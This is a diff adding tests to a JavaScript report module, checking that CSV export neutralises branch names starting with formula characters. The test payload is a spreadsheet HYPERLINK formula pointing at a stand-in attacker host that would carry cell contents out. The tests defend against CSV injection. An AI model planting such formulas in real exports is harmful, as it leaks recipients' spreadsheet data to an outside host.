@@ -414,4 +414,24 @@ describe("Reports", () => {
   test("an empty report produces empty output rather than a broken header", () => {
     assert.equal(toCsv([]), "");
   });
+
+  /**
+   * Quoting satisfies a CSV parser; it does not stop a spreadsheet evaluating a
+   * cell. Branch names reach the branch report, and a report is the one thing
+   * here designed to leave the platform — so a branch named `=HYPERLINK(...)`
+   * would otherwise arrive as a working link in an executive's inbox.
+   */
+  for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
+    test(`csv neutralises a field opening with ${JSON.stringify(lead)}`, () => {
+      const payload = `${lead}HYPERLINK("https://attacker.example"&A1,"Loading")`;
+      const csv = toCsv([{ branch: payload }]);
+      assert.match(csv, /^"branch"\n"'/, "the value must be prefixed so it is read as text");
+      // The text itself survives — this is a display convention, not redaction.
+      assert.ok(csv.includes("HYPERLINK"), "the original value must still be present");
+    });
+  }
+
+  test("csv leaves an ordinary value untouched", () => {
+    assert.equal(toCsv([{ branch: "Madurai" }]), '"branch"\n"Madurai"');
+  });
 });
